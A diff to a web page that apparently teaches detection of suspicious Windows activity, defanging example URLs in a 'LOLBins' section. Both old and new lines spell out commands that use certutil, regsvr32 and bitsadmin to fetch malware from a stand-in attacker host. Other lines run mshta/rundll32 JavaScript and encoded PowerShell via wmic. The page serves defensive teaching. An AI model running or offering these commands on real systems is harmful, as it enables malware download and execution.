@@ -1105,12 +1105,12 @@ Subject:
 
         <h4>1. LOLBins (Living Off the Land Binaries)</h4>
         <pre><code># Suspicious uses of legitimate Windows binaries
-certutil.exe -urlcache -split -f http://evil.com/malware.exe
+certutil.exe -urlcache -split -f hxxp://evil[.]com/malware[.]exe
 mshta.exe javascript:evil()
-regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
+regsvr32.exe /s /n /u /i:hxxp://evil[.]com/file[.]sct scrobj.dll
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
 wmic.exe process call create "powershell -enc base64..."
-bitsadmin.exe /transfer job http://evil.com/malware.exe c:\temp\m.exe</code></pre>
+bitsadmin.exe /transfer job hxxp://evil[.]com/malware[.]exe c:\temp\m.exe</code></pre>
 
         <h4>2. Encoded PowerShell</h4>
         <pre><code># Base64 encoded commands (-enc, -encodedcommand)
